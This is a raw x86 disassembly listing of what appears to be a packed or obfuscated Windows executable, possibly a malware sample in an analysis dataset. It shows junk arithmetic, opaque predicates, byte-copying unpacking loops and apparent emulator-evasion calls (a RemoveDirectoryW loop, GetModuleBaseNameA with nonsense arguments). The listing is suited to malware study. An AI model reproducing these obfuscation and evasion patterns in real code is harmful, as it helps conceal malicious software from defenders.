0x00401000:	pushl	%ebp	; from: 0x0041f062(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	jmp	0x00401312	; targets: 0x00401312(MAY)
0x00401312:	subl	$0x28, %esp	; from: 0x00401003(MAY)
0x00401315:	pushl	%esi
0x00401316:	movl	$0x345f3ee8, -40(%ebp)
0x0040131d:	movl	$0xdedbe5ac, %eax
0x00401322:	movl	%eax, -36(%ebp)
0x00401325:	movl	$0x345f3eec, -32(%ebp)
0x0040132c:	movl	%eax, -28(%ebp)
0x0040132f:	movl	$0x3daf, -8(%ebp)
0x00401336:	movl	-8(%ebp), %eax
0x00401339:	xorl	$0x4a98, %eax
0x0040133e:	orl	$0x3564, %eax
0x00401343:	shrl	%eax
0x00401345:	addl	$0x3ebf, %eax
0x0040134a:	orl	$0x71f6, %eax
0x0040134f:	movl	%eax, -28(%ebp)
0x00401352:	movl	$0x7868, -20(%ebp)
0x00401359:	movl	$0x2955, -16(%ebp)
0x00401360:	movl	$0x2d5e, -12(%ebp)
0x00401367:	movl	$0x2, -8(%ebp)
0x0040136e:	movl	-8(%ebp), %ecx
0x00401371:	movl	-12(%ebp), %eax
0x00401374:	xorl	%edx, %edx
0x00401376:	jmp	0x00401685	; targets: 0x00401685(MAY)
0x00401685:	divl	%ecx, %eax	; from: 0x00401376(MAY)
0x00401687:	movl	-16(%ebp), %ecx
0x0040168a:	subl	%ecx, %eax
0x0040168c:	movl	-20(%ebp), %ecx
0x0040168f:	andl	$0x58af, %eax
0x00401694:	imull	$0x7420, %eax, %eax
0x0040169a:	subl	%ecx, %eax
0x0040169c:	movl	-28(%ebp), %ecx
0x0040169f:	cmpl	%eax, %ecx
0x004016a1:	ja	0x00404618	; targets: 0x00404618(MAY), 0x004016a7(MAY)
0x004016a7:	movb	0x0042f666, %al	; from: 0x004016a1(MAY)
0x004016ac:	movb	0x0042f665, %cl
0x004016b2:	jmp	0x004019c1	; targets: 0x004019c1(MAY)
0x004019c1:	addb	%cl, %al	; from: 0x004016b2(MAY)
0x004019c3:	movb	0x0042f664, %cl
0x004019c9:	movzbl	%al, %eax
0x004019cc:	movzbl	%cl, %ecx
0x004019cf:	cltd	
0x004019d0:	idivl	%ecx, %eax
0x004019d2:	jmp	0x00401ce1	; targets: 0x00401ce1(MAY)
0x00401ce1:	movb	$0x4b, %cl	; from: 0x004019d2(MAY)
0x00401ce3:	jmp	0x00401ff2	; targets: 0x00401ff2(MAY)
0x00401ff2:	imulb	%cl, %al	; from: 0x00401ce3(MAY)
0x00401ff4:	movb	$0xffffffe6, %cl
0x00401ff6:	xorl	$0xe, %eax
0x00401ff9:	movb	%al, -5(%ebp)
0x00401ffc:	movb	$0xffffffe4, -2(%ebp)
0x00402000:	movb	$0x6d, -1(%ebp)
0x00402004:	movb	-1(%ebp), %al
0x00402007:	imulb	%cl, %al
0x00402009:	movb	0x0042f667, %cl
0x0040200f:	xorb	%cl, %al
0x00402011:	movb	-2(%ebp), %cl
0x00402014:	orb	%al, %cl
0x00402016:	movb	-5(%ebp), %al
0x00402019:	cmpb	%cl, %al
0x0040201b:	je	0x00404618	; targets: 0x00402021(MAY), 0x00404618(MAY)
0x00402021:	movl	$0x5049, -32(%ebp)	; from: 0x0040201b(MAY)
0x00402028:	pushl	$0x135b
0x0040202d:	movl	$0x7bc8, -28(%ebp)
0x00402034:	movl	-32(%ebp), %eax
0x00402037:	movl	-28(%ebp), %ecx
0x0040203a:	pushl	$0x75fc
0x0040203f:	pushl	%ecx
0x00402040:	pushl	%eax
0x00402041:	call	0x0041ee77	; targets: 0x0041ee77(MAY)
0x00402046:	movl	0x0042f668, %ecx	; from: 0x0041eeec(MAY)
0x0040204c:	movl	0x0042f66c, %esi
0x00402052:	pushl	$0x2182a8e
0x00402057:	pushl	$0x1c7cc0d
0x0040205c:	xorl	%esi, %edx
0x0040205e:	jmp	0x0040236d	; targets: 0x0040236d(MAY)
0x0040236d:	xorl	%ecx, %eax	; from: 0x0040205e(MAY)
0x0040236f:	jmp	0x0040267e	; targets: 0x0040267e(MAY)
0x0040267e:	pushl	%edx	; from: 0x0040236f(MAY)
0x0040267f:	pushl	%eax
0x00402680:	call	0x0041ee77	; targets: 0x0041ee77(MAY)
0x00402685:	orl	$0xa26, %eax	; from: 0x0041eeec(MAY)
0x0040268a:	movl	%eax, -32(%ebp)
0x0040268d:	orl	$0x2055, %edx
0x00402693:	jmp	0x004029a2	; targets: 0x004029a2(MAY)
0x004029a2:	movl	%edx, -28(%ebp)	; from: 0x00402693(MAY)
0x004029a5:	movl	$0x7889, %eax
0x004029aa:	movw	%ax, -8(%ebp)
0x004029ae:	jmp	0x00402cbd	; targets: 0x00402cbd(MAY)
0x00402cbd:	movw	0x0042f678, %ax	; from: 0x004029ae(MAY)
0x00402cc3:	movzwl	%ax, %ecx
0x00402cc6:	movw	0x0042f674, %ax
0x00402ccc:	movzwl	%ax, %eax
0x00402ccf:	cltd	
0x00402cd0:	idivl	%ecx, %eax
0x00402cd2:	movzwl	%ax, %ecx
0x00402cd5:	jmp	0x00402fe4	; targets: 0x00402fe4(MAY)
0x00402fe4:	movw	0x0042f670, %ax	; from: 0x00402cd5(MAY)
0x00402fea:	movzwl	%ax, %eax
0x00402fed:	xorl	%ecx, %eax
0x00402fef:	jmp	0x004032fe	; targets: 0x004032fe(MAY)
0x004032fe:	movzwl	-8(%ebp), %ecx	; from: 0x00402fef(MAY)
0x00403302:	orl	%eax, %ecx
0x00403304:	movw	%cx, -8(%ebp)
0x00403308:	movl	0x0042f684, %eax
0x0040330d:	cmpl	$0x2809a89a, %eax
0x00403312:	jne	0x00404618	; targets: 0x00403318(MAY)
0x00403318:	movl	-40(%ebp), %eax	; from: 0x00403312(MAY)
0x0040331b:	movl	-36(%ebp), %ecx
0x0040331e:	movl	-40(%ebp), %edx
0x00403321:	movl	-36(%ebp), %esi
0x00403324:	jmp	0x00403633	; targets: 0x00403633(MAY)
0x00403633:	shrdl	$0x2, %ecx, %eax	; from: 0x00403324(MAY)
0x00403637:	shll	$0x1e, %edx
0x0040363a:	movl	0x0042f268, %edx
0x00403640:	movl	0x1a8(%edx), %edx
0x00403646:	shrl	$0x2, %ecx
0x00403649:	movl	$0xd17cfba, %ecx
0x0040364e:	xorl	%ecx, %eax
0x00403650:	xorl	%esi, %esi
0x00403652:	jmp	0x00403961	; targets: 0x00403961(MAY)
0x00403961:	orl	%esi, %eax	; from: 0x00403652(MAY)
0x00403963:	movl	%eax, (%edx)
0x00403965:	jmp	0x00403c74	; targets: 0x00403c74(MAY)
0x00403c74:	movl	-40(%ebp), %eax	; from: 0x00403965(MAY)
0x00403c77:	movl	-36(%ebp), %edx
0x00403c7a:	shrdl	$0x2, %edx, %eax
0x00403c7e:	shrl	$0x2, %edx
0x00403c81:	movl	-40(%ebp), %edx
0x00403c84:	movl	-36(%ebp), %esi
0x00403c87:	jmp	0x00403f96	; targets: 0x00403f96(MAY)
0x00403f96:	xorl	%ecx, %eax	; from: 0x00403c87(MAY)
0x00403f98:	xorl	%esi, %esi
0x00403f9a:	orl	%esi, %eax
0x00403f9c:	movl	%eax, 0x0042f684
0x00403fa1:	movb	$0xffffffa6, -5(%ebp)
0x00403fa5:	movb	-5(%ebp), %al
0x00403fa8:	subb	$0x6, %al
0x00403faa:	orb	$0xfffffff0, %al
0x00403fac:	jmp	0x004042bb	; targets: 0x004042bb(MAY)
0x004042bb:	shll	$0x1e, %edx	; from: 0x00403fac(MAY)
0x004042be:	movb	%al, -5(%ebp)
0x004042c1:	movb	0x0042f67c, %dl
0x004042c7:	movb	0x0042f67b, %al
0x004042cc:	xorb	$0xffffffa4, %dl
0x004042cf:	imulb	%dl, %al
0x004042d1:	movb	$0xffffff8f, %dl
0x004042d3:	imulb	%dl, %al
0x004042d5:	movb	0x0042f67a, %dl
0x004042db:	andb	%al, %dl
0x004042dd:	movb	-5(%ebp), %al
0x004042e0:	cmpb	%dl, %al
0x004042e2:	jb	0x00404618	; targets: 0x004042e8(MAY)
0x004042e8:	movl	-40(%ebp), %eax	; from: 0x004042e2(MAY)
0x004042eb:	movl	-36(%ebp), %edx
0x004042ee:	shrdl	$0x2, %edx, %eax
0x004042f2:	xorl	%ecx, %eax
0x004042f4:	movl	-40(%ebp), %ecx
0x004042f7:	shrl	$0x2, %edx
0x004042fa:	movl	-36(%ebp), %edx
0x004042fd:	xorl	%edx, %edx
0x004042ff:	shll	$0x1e, %ecx
0x00404302:	jmp	0x00404611	; targets: 0x00404611(MAY)
0x00404611:	orl	%edx, %eax	; from: 0x00404302(MAY)
0x00404613:	movl	%eax, 0x0042f370
0x00404618:	popl	%esi	; from: 0x004016a1(MAY), 0x0040201b(MAY)
0x00404619:	leave	
0x0040461a:	ret	; targets: 0x0041f067(MAY)

0x00415287:	pushl	%ebp	; from: 0x00420bbb(MAY)
0x00415288:	movl	%esp, %ebp
0x0041528a:	subl	$0xac, %esp
0x00415290:	pushl	%ebx
0x00415291:	pushl	%esi
0x00415292:	movl	$0x7dea, -8(%ebp)
0x00415299:	xorl	%esi, %esi
0x0041529b:	incl	%esi
0x0041e569:	pushl	%ebp	; from: 0x0041f0ec(MAY)
0x0041e56a:	movl	%esp, %ebp
0x0041e56c:	subl	$0x1c, %esp
0x0041e56f:	movl	$0x499, -4(%ebp)
0x0041e576:	movl	$0x27dc, -12(%ebp)
0x0041e57d:	movl	$0x7671, -8(%ebp)
0x0041e584:	movl	-4(%ebp), %ecx
0x0041e587:	addl	$0x309f, %ecx
0x0041e58d:	orl	$0x542c, %ecx
0x0041e593:	xorl	$0x145a, %ecx
0x0041e599:	shrl	%ecx
0x0041e59b:	pushl	%esi
0x0041e59c:	addl	$0x1efe, %ecx
0x0041e5a2:	pushl	%edi
0x0041e5a3:	movl	$0x6d13, -4(%ebp)	; from: 0x0041e637(MAY)
0x0041e5aa:	movl	0x0042f620, %eax
0x0041e5af:	imull	$0xfffff264, %eax, %eax
0x0041e5b5:	andl	$0x531c, %eax
0x0041e5ba:	movl	%ecx, %edx
0x0041e5bc:	subl	%eax, %edx
0x0041e5be:	movl	0x8(%ebp), %eax
0x0041e5c1:	leal	-46681(%edx,%eax), %eax
0x0041e5c8:	movl	0x0042f61c, %edx
0x0041e5ce:	addl	%edx, %eax
0x0041e5d0:	movl	-4(%ebp), %edx
0x0041e5d3:	movl	0x0042f624, %esi
0x0041e5d9:	movb	(%eax), %al
0x0041e5db:	andl	$0x5ce, %edx
0x0041e5e1:	xorl	$0x7a8f, %edx
0x0041e5e7:	imull	%esi, %edx
0x0041e5ea:	movl	0x0042f268, %esi
0x0041e5f0:	movl	0x1cc(%esi), %esi
0x0041e5f6:	subl	%edx, %esi
0x0041e5f8:	movb	%al, 0x593294c(%esi,%ecx)
0x0041e5ff:	movl	-8(%ebp), %eax
0x0041e602:	addl	-12(%ebp), %eax
0x0041e605:	pushl	$0x1a
0x0041e607:	imull	$0x2cd7, %eax, %eax
0x0041e60d:	orl	$0x1c8c, %eax
0x0041e612:	xorl	$0x1bba3eae, %eax
0x0041e617:	addl	%eax, %ecx
0x0041e619:	movl	0x0042f618, %eax
0x0041e61e:	movl	0x0042f614, %edx
0x0041e624:	xorl	%edx, %eax
0x0041e626:	orl	$0x509b, %eax
0x0041e62b:	xorl	%edx, %edx
0x0041e62d:	popl	%esi
0x0041e62e:	divl	%esi, %eax
0x0041e630:	addl	$0x4ad3, %eax
0x0041e635:	cmpl	%eax, %ecx
0x0041e637:	jne	0x0041e5a3	; targets: 0x0041e63d(MAY), 0x0041e5a3(MAY)
0x0041e63d:	movl	$0x59f0, -28(%ebp)	; from: 0x0041e637(MAY)
0x0041e644:	movl	$0x7953, -24(%ebp)
0x0041e64b:	movl	$0x1c5b, -20(%ebp)
0x0041e652:	movl	$0x7017, -16(%ebp)
0x0041e659:	movl	0x0042f62c, %eax
0x0041e65e:	addl	$0x1599, %eax
0x0041e663:	pushl	$0x3
0x0041e665:	popl	%ecx
0x0041e666:	xorl	$0x74d6, %eax
0x0041e66b:	xorl	%edx, %edx
0x0041e66d:	divl	%ecx, %eax
0x0041e66f:	movl	0x0042f628, %ecx
0x0041e675:	pushl	%ebx
0x0041e676:	imull	%eax, %ecx
0x0041e679:	andl	$0x22fc, %ecx
0x0041e67f:	addl	$0x1a4b, %ecx
0x0041e685:	movl	$0x451e, 0x8(%ebp)	; from: 0x0041e738(MAY)
0x0041e68c:	movl	$0x4ee6, -4(%ebp)
0x0041e693:	movl	$0x2929, -8(%ebp)
0x0041e69a:	movl	$0x552, -12(%ebp)
0x0041e6a1:	movl	0x8(%ebp), %eax
0x0041e6a4:	movl	0x0042f63c, %esi
0x0041e6aa:	addl	$0x403b, %eax
0x0041e6af:	orl	$0x4c44, %eax
0x0041e6b4:	xorl	%edx, %edx
0x0041e6b6:	divl	%esi, %eax
0x0041e6b8:	movl	0x0042f638, %edx
0x0041e6be:	movl	%ecx, %esi
0x0041e6c0:	pushl	$0x3
0x0041e6c2:	popl	%edi
0x0041e6c3:	addl	$0x6a54, %eax
0x0041e6c8:	andl	%eax, %edx
0x0041e6ca:	movl	0x0042f640, %eax
0x0041e6cf:	xorl	$0x2b59, %edx
0x0041e6d5:	subl	%edx, %esi
0x0041e6d7:	xorl	%edx, %edx
0x0041e6d9:	divl	%edi, %eax
0x0041e6db:	movl	-12(%ebp), %edx
0x0041e6de:	addl	0xc(%ebp), %esi
0x0041e6e1:	andl	%eax, %edx
0x0041e6e3:	movl	-8(%ebp), %eax
0x0041e6e6:	orl	%eax, %edx
0x0041e6e8:	movl	0x0042f268, %eax
0x0041e6ed:	movl	0x1d0(%eax), %eax
0x0041e6f3:	subl	%edx, %eax
0x0041e6f5:	movl	-4(%ebp), %edx
0x0041e6f8:	movb	(%esi), %bl
0x0041e6fa:	leal	-24536(%eax,%ecx), %eax
0x0041e701:	movb	%bl, (%edx,%eax)
0x0041e704:	movl	-16(%ebp), %eax
0x0041e707:	movl	-20(%ebp), %edx
0x0041e70a:	andl	$0x1b00, %eax
0x0041e70f:	imull	%edx, %eax
0x0041e712:	leal	-29732863(%ecx,%eax), %ecx
0x0041e719:	movl	-24(%ebp), %eax
0x0041e71c:	movl	-28(%ebp), %edx
0x0041e71f:	orl	%edx, %eax
0x0041e721:	movl	0x0042f630, %edx
0x0041e727:	subl	%edx, %eax
0x0041e729:	movl	0x0042f634, %edx
0x0041e72f:	addl	$0xffff9d5a, %eax
0x0041e734:	addl	%eax, %edx
0x0041e736:	cmpl	%edx, %ecx
0x0041e738:	jne	0x0041e685	; targets: 0x0041e685(MAY), 0x0041e73e(MAY)
0x0041e73e:	movl	$0x377c, -28(%ebp)	; from: 0x0041e738(MAY)
0x0041e745:	movl	0x0042f64c, %eax
0x0041e74a:	movl	0x0042f648, %ecx
0x0041e750:	imull	%ecx, %eax
0x0041e753:	movl	0x0042f644, %ecx
0x0041e759:	movl	0x0042f654, %esi
0x0041e75f:	xorl	%eax, %ecx
0x0041e761:	movl	0x0042f650, %eax
0x0041e766:	imull	$0x6da8, %ecx, %ecx
0x0041e76c:	xorl	%edx, %edx
0x0041e76e:	subl	$0x57fc2052, %ecx
0x0041e774:	divl	%esi, %eax
0x0041e776:	movl	$0x2d46d183, %esi
0x0041e77b:	popl	%ebx
0x0041e77c:	jmp	0x0041e816	; targets: 0x0041e816(MAY)
0x0041e781:	movl	$0x298c, 0xc(%ebp)	; from: 0x0041e820(MAY)
0x0041e788:	movl	$0x331a, 0x8(%ebp)
0x0041e78f:	movl	0x8(%ebp), %eax
0x0041e792:	movl	0xc(%ebp), %edx
0x0041e795:	andl	$0x52d1, %eax
0x0041e79a:	addl	$0x5542, %eax
0x0041e79f:	imull	%edx, %eax
0x0041e7a2:	movl	0x0042f660, %edx
0x0041e7a8:	imull	$0x5780, %eax, %eax
0x0041e7ae:	movl	0x0042f268, %edi
0x0041e7b4:	movl	0x1d4(%edi), %edi
0x0041e7ba:	subl	$0x6fb, %edx
0x0041e7c0:	andl	$0xc14, %edx
0x0041e7c6:	orl	$0x40aa, %edx
0x0041e7cc:	addl	%ecx, %eax
0x0041e7ce:	xorl	$0x5148, %edx
0x0041e7d4:	subl	%edx, %edi
0x0041e7d6:	movl	0x10(%ebp), %edx
0x0041e7d9:	movb	-900263414(%eax,%edx), %al
0x0041e7e0:	movb	%al, (%edi,%ecx)
0x0041e7e3:	movl	0x0042f65c, %eax
0x0041e7e8:	movl	0x0042f658, %edx
0x0041e7ee:	subl	$0x511a, %eax
0x0041e7f3:	xorl	$0x46da, %eax
0x0041e7f8:	imull	%eax, %edx
0x0041e7fb:	movl	-28(%ebp), %eax
0x0041e7fe:	movl	0x0042f654, %edi
0x0041e804:	addl	%edx, %eax
0x0041e806:	xorl	$0xf7bf60ed, %eax
0x0041e80b:	addl	%eax, %ecx
0x0041e80d:	movl	0x0042f650, %eax
0x0041e812:	xorl	%edx, %edx
0x0041e814:	divl	%edi, %eax
0x0041e816:	imull	$0xcf8b424, %eax, %eax	; from: 0x0041e77c(MAY)
0x0041e81c:	subl	%esi, %eax
0x0041e81e:	cmpl	%eax, %ecx
0x0041e820:	jbe	0x0041e781	; targets: 0x0041e781(MAY), 0x0041e826(MAY)
0x0041e826:	popl	%edi	; from: 0x0041e820(MAY)
0x0041e827:	popl	%esi
0x0041e828:	leave	
0x0041e829:	ret	$0xc	; targets: 0x0041f0f1(MAY)

0x0041ee77:	movzwl	0x0042148b, %eax	; from: 0x00402680(MAY), 0x00402041(MAY)
0x0041ee7e:	adcl	%eax, 0x00421383
0x0041ee84:	movl	0x8(%esp), %eax
0x0041ee88:	andl	0x00421393, %ecx
0x0041ee8e:	movl	0x10(%esp), %ecx
0x0041ee92:	orl	%eax, %ecx
0x0041ee94:	movl	$0x22f6, 0x004216a7
0x0041ee9e:	movl	0xc(%esp), %ecx
0x0041eea2:	jne	0x0041eebb	; targets: 0x0041eebb(MAY)
0x0041eebb:	incl	0x004213e3	; from: 0x0041eea2(MAY)
0x0041eec1:	pushl	%ebx
0x0041eec2:	movzbl	0x00421473, %ebx
0x0041eec9:	sbbl	0x00421313, %ebx
0x0041eecf:	movl	%ebx, 0x00421473
0x0041eed5:	mull	%ecx, %eax
0x0041eed7:	movl	%eax, %ebx
0x0041eed9:	movl	0x8(%esp), %eax
0x0041eedd:	mull	0x14(%esp), %eax
0x0041eee1:	addl	%eax, %ebx
0x0041eee3:	movl	0x8(%esp), %eax
0x0041eee7:	mull	%ecx, %eax
0x0041eee9:	addl	%ebx, %edx
0x0041eeeb:	popl	%ebx
0x0041eeec:	ret	$0x10	; targets: 0x00402046(MAY), 0x00402685(MAY)


start:
0x0041efea:	pushl	%ebp
0x0041efeb:	movl	%esp, %ebp
0x0041efed:	andl	$0xfffffff8, %esp
0x0041eff0:	subl	$0x20c, %esp
0x0041eff6:	pushl	%ebx
0x0041eff7:	pushl	%esi
0x0041eff8:	pushl	%edi
0x0041eff9:	pushl	$0x6
0x0041effb:	popl	%esi
0x0041effc:	movl	0x0042f04c, %eax	; from: 0x0041f03f(MAY)
0x0041f001:	incl	%eax
0x0041f002:	pushl	%eax
0x0041f003:	call	strlen@msvcrt.dll	; targets: 0xff000200(MAY)
0x0041f009:	movl	%eax, %edi
0x0041f00b:	movl	0x0042f07c, %eax
0x0041f010:	popl	%ecx
0x0041f011:	addl	$0x2, %eax
0x0041f014:	pushl	%eax
0x0041f015:	call	wcslen@msvcrt.dll	; targets: 0xff0001f0(MAY)
0x0041f01b:	popl	%ecx
0x0041f01c:	cmpl	%edi, %eax
0x0041f01e:	je	0x0041f640	; targets: 0x0041f640(MAY), 0x0041f024(MAY)
0x0041f024:	pushl	0x0042f07c	; from: 0x0041f01e(MAY)
0x0041f02a:	call	RemoveDirectoryW@kernel32.dll	; targets: 0xff000110(MAY)
0x0041f030:	testl	%eax, %eax
0x0041f032:	jne	0x0041f626	; targets: 0x0041f626(MAY), 0x0041f038(MAY)
0x0041f038:	incl	%esi	; from: 0x0041f032(MAY)
0x0041f039:	cmpl	$0x20b, %esi
0x0041f03f:	jb	0x0041effc	; targets: 0x0041f045(MAY), 0x0041effc(MAY)
0x0041f045:	movl	$0x345f3ee8, 0x18(%esp)	; from: 0x0041f03f(MAY)
0x0041f04d:	movl	$0xdedbe5ac, %ebx
0x0041f052:	movl	%ebx, 0x1c(%esp)
0x0041f056:	movl	$0x345f3eec, 0x38(%esp)
0x0041f05e:	movl	%ebx, 0x3c(%esp)
0x0041f062:	call	0x00401000	; targets: 0x00401000(MAY)
0x0041f067:	leal	0x60(%esp), %eax	; from: 0x0040461a(MAY)
0x0041f06b:	movl	%eax, 0xb4(%esp)
0x0041f072:	leal	0x5c(%esp), %eax
0x0041f076:	movl	%eax, 0x48(%esp)
0x0041f07a:	movl	0x0042f268, %eax
0x0041f07f:	movl	0x1d8(%eax), %eax
0x0041f085:	movl	(%eax), %eax
0x0041f087:	movl	%eax, %ecx
0x0041f089:	notl	%eax
0x0041f08b:	shll	$0x1e, %eax
0x0041f08e:	movl	$0xdb6988ff, %edi
0x0041f093:	xorl	%edi, %ecx
0x0041f095:	shrl	$0x2, %ecx
0x0041f098:	orl	%eax, %ecx
0x0041f09a:	movl	0x48(%esp), %eax
0x0041f09e:	movl	%ecx, (%eax)
0x0041f0a0:	movl	0x0042f268, %ecx
0x0041f0a6:	movl	0x19c(%ecx), %ecx
0x0041f0ac:	movl	(%ecx), %ecx
0x0041f0ae:	movl	$0x345f3ef8, %eax
0x0041f0b3:	movl	%eax, 0x210(%esp)
0x0041f0ba:	movl	%ebx, 0x214(%esp)
0x0041f0c1:	movl	%ecx, 0xf8(%esp)
0x0041f0c8:	movl	%eax, 0x20(%esp)
0x0041f0cc:	movl	%ebx, 0x24(%esp)
0x0041f0d0:	movl	%eax, 0x20(%esp)
0x0041f0d4:	movl	%ebx, 0x24(%esp)
0x0041f0d8:	movl	%eax, 0x20(%esp)
0x0041f0dc:	leal	0x10(%ebp), %eax
0x0041f0df:	pushl	%eax
0x0041f0e0:	leal	0xc(%ebp), %eax
0x0041f0e3:	pushl	%eax
0x0041f0e4:	leal	0x8(%ebp), %eax
0x0041f0e7:	movl	%ebx, 0x2c(%esp)
0x0041f0eb:	pushl	%eax
0x0041f0ec:	call	0x0041e569	; targets: 0x0041e569(MAY)
0x0041f0f1:	movl	0x0042f0ec, %ecx	; from: 0x0041e829(MAY)
0x0041f0f7:	movl	0x0042f0ec, %eax
0x0041f0fc:	shll	$0x2, %eax
0x0041f0ff:	shrl	$0x1e, %ecx
0x0041f102:	orl	%ecx, %eax
0x0041f104:	movl	0xb4(%esp), %ecx
0x0041f10b:	xorl	%edi, %eax
0x0041f10d:	movl	%eax, (%ecx)
0x0041f10f:	movl	0x50(%esp), %ecx
0x0041f113:	leal	0x50(%esp), %eax
0x0041f117:	movl	%eax, 0x64(%esp)
0x0041f11b:	leal	0x64(%esp), %eax
0x0041f11f:	movl	%eax, 0x1ac(%esp)
0x0041f126:	movl	0x50(%esp), %eax
0x0041f12a:	subl	%ecx, %eax
0x0041f12c:	leal	0x4(%ebp), %ecx
0x0041f12f:	xorl	%ecx, %eax
0x0041f131:	xorl	%ecx, %ecx
0x0041f133:	movl	%eax, 0x50(%esp)
0x0041f137:	movl	$0xd17cfba, %esi
0x0041f13c:	xorl	%esi, %eax
0x0041f13e:	xorl	$0xf7b6f96b, %ecx
0x0041f144:	shldl	$0x2, %eax, %ecx
0x0041f148:	movl	%ecx, 0x24(%esp)
0x0041f14c:	movl	0x18(%esp), %ecx
0x0041f150:	movl	0x1c(%esp), %edx
0x0041f154:	shll	$0x2, %eax
0x0041f157:	cmpl	%ecx, %eax
0x0041f159:	jne	0x0041f169	; targets: 0x0041f15f(MAY), 0x0041f169(MAY)
0x0041f15f:	cmpl	%edx, 0x24(%esp)	; from: 0x0041f159(MAY)
0x0041f163:	je	0x00420bd3	; targets: 0x0041f169(MAY), 0x00420bd3(MAY)
0x0041f169:	movl	0x60(%esp), %eax	; from: 0x0041f159(MAY), 0x0041f163(MAY)
0x0041f16d:	cmpl	$0xdb6988fb, %eax
0x0041f172:	je	0x0041f1c1	; targets: 0x0041f178(MAY), 0x0041f1c1(MAY)
0x0041f178:	movl	0x18(%esp), %edx	; from: 0x0041f172(MAY)
0x0041f17c:	movl	0x1c(%esp), %eax
0x0041f180:	xorl	%ebx, %eax
0x0041f182:	xorl	$0x345f3eeb, %edx
0x0041f188:	shrdl	$0x2, %eax, %edx
0x0041f18c:	shrl	$0x2, %eax
0x0041f18f:	movl	%eax, 0x24(%esp)
0x0041f193:	movl	0x18(%esp), %eax
0x0041f197:	movl	0x1c(%esp), %ecx
0x0041f19b:	shll	$0x1e, %eax
0x0041f19e:	orl	0x24(%esp), %eax
0x0041f1a2:	xorl	%ecx, %ecx
0x0041f1a4:	movl	%eax, 0x24(%esp)
0x0041f1a8:	movl	0x5c(%esp), %eax
0x0041f1ac:	orl	%edx, %ecx
0x0041f1ae:	cltd	
0x0041f1af:	cmpl	%eax, %ecx
0x0041f1b1:	jne	0x00420bd3	; targets: 0x0041f1b7(MAY)
0x0041f1b7:	cmpl	%edx, 0x24(%esp)	; from: 0x0041f1b1(MAY)
0x0041f1bb:	jne	0x00420bd3	; targets: 0x0041f1c1(MAY)
0x0041f1c1:	movl	$0x42f304, 0xe0(%esp)	; from: 0x0041f172(MAY), 0x0041f1bb(MAY)
0x0041f1cc:	movl	$0x42f2fc, 0xe8(%esp)
0x0041f1d7:	movl	0xf8(%esp), %eax
0x0041f1de:	movl	0xf8(%esp), %eax
0x0041f1e5:	xorl	%ecx, %ecx
0x0041f1e7:	xorl	%esi, %eax
0x0041f1e9:	xorl	$0xf7b6f96b, %ecx
0x0041f1ef:	shldl	$0x2, %eax, %ecx
0x0041f1f3:	movl	%ecx, 0x24(%esp)
0x0041f1f7:	movl	0x18(%esp), %ecx
0x0041f1fb:	movl	0x1c(%esp), %edx
0x0041f1ff:	shll	$0x2, %eax
0x0041f202:	cmpl	%eax, %ecx
0x0041f204:	jne	0x00420b7c	; targets: 0x00420b7c(MAY)
0x0041f626:	pushl	$0x7566754	; from: 0x0041f032(MAY)
0x0041f62b:	pushl	$0x87657654
0x0041f630:	pushl	$0x86776565
0x0041f635:	pushl	$0x87567654
0x0041f63a:	call	GetModuleBaseNameA@psapi.dll	; targets: 0xff0001d0(MAY)
0x0041f640:	xorl	%eax, %eax	; from: 0x0041f01e(MAY)
0x0041f642:	jmp	0x00420bf6	; targets: 0x00420bf6(MAY)
0x00420b7c:	movl	0xe8(%esp), %eax	; from: 0x0041f204(MAY)
0x00420b83:	movl	0xe8(%esp), %ecx
0x00420b8a:	movl	(%eax), %eax
0x00420b8c:	cmpl	(%ecx), %eax
0x00420b8e:	jne	0x00420bd3	; targets: 0x00420bd3(MAY), 0x00420b94(MAY)
0x00420b94:	movl	0xe0(%esp), %eax	; from: 0x00420b8e(MAY)
0x00420b9b:	movl	0xe0(%esp), %ecx
0x00420ba2:	movl	(%eax), %eax
0x00420ba4:	cmpl	(%ecx), %eax
0x00420ba6:	jne	0x00420bd3	; targets: 0x00420bd3(MAY), 0x00420bac(MAY)
0x00420bac:	leal	0x1ac(%esp), %eax	; from: 0x00420ba6(MAY)
0x00420bb3:	pushl	%eax
0x00420bb4:	leal	0x108(%esp), %edi
0x00420bbb:	call	0x00415287	; targets: 0x00415287(MAY)
0x00420bd3:	leal	0x104(%esp), %eax	; from: 0x00420b8e(MAY), 0x00420ba6(MAY), 0x0041f163(MAY)
0x00420bda:	pushl	%eax
0x00420bdb:	leal	0x64(%esp), %eax
0x00420bdf:	pushl	%eax
0x00420be0:	pushl	0x58(%esp)
0x00420be4:	leal	0x68(%esp), %eax
0x00420be8:	call	0x00420bff	; targets: 0x00420bff(MAY)
0x00420bf6:	popl	%edi	; from: 0x0041f642(MAY)
0x00420bf7:	popl	%esi
0x00420bf8:	popl	%ebx
0x00420bf9:	movl	%ebp, %esp
0x00420bfb:	popl	%ebp
0x00420bfc:	ret	$0xc	; targets: 0xfee70000(MAY)

0x00420bff:	pushl	%ebp	; from: 0x00420be8(MAY)
0x00420c00:	movl	%esp, %ebp
0x00420c02:	subl	$0x10, %esp
0x00420c05:	pushl	%ebx
0x00420c06:	pushl	%esi
0x00420c07:	addl	%ebx, %esi
0x00420c09:	movl	0x004214f3, %ebx
0x00420c0f:	xorl	%esi, %esi
0x00420c11:	orl	0x00421613, %esi
0x00420c17:	subl	%esi, %ebx
0x00420c19:	imull	(%ebx,%esi), %ebx
0x00420c1d:	movzwl	0x0042169f, %ebx
0x00420c24:	andl	%ebx, 0x0042174f
0x00420c2a:	subl	%edi, 0x004214b7
0x00420c30:	orl	$0x73a1, 0x00421677
0x00420c3a:	incl	0x00421697
